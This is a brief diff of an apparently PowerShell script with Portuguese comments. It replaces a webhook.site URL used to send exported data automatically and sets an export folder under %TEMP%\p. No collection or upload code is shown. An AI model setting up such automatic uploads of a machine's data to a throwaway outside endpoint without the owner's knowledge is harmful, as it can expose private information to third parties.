@@ -12,7 +12,7 @@
 # === CONFIGURAÇÕES (edite aqui antes de executar) ===
 
 # Deixe vazio ('') se não quiser enviar automaticamente para webhook
-$WebhookUrl = 'https://webhook.site/b07c5a40-376c-496c-817e-6c1b8d51f926'
+$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'
 
 # Pasta de exportação (padrão: %TEMP%\p)
 $ExportDirDefault = Join-Path $env:TEMP 'p'
